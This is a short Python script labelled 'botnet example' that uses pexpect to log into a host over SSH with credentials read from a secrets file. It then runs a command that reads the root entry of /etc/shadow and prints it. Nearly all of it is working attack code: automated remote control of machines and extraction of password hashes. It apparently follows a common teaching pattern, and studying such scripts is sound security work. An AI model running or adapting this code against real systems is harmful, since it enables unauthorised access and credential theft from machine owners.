''' botnet example'''
import os
import sys
import pexpect

# pylint: disable=C0413
sys.path.append(os.path.realpath('../../..'))
from jackmanimation.gameitems.gamefunctions import credscheck

PROMPT = ['# ', '>>> ', '> ', r'\$ ']


def send_command(child, cmd):
    '''send command to bot'''
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)


def connect(user, host, password):
    '''connect to bot'''
    ssh_newkey = 'Are you sure you want to continue connecting'
    connStr = 'ssh ' + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])
    if ret == 0:
        print('[-] Error Connecting')
        return None
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])
        if ret == 0:
            print('[-] Error Connecting')
            return None
    child.sendline(password)
    child.expect(PROMPT)
    return child


def main():
    '''main function'''
    print('[+] Botnet started')
    botid = credscheck('../../../secrets/secrets.json')
    host = botid["hostname1"]
    user = botid["hostuser"]
    password = botid["password"]
    child = connect(user, host, password)
    send_command(child, 'cat /etc/shadow | grep root')
    print('[+] Botnet finished')


if __name__ == '__main__':
    main()
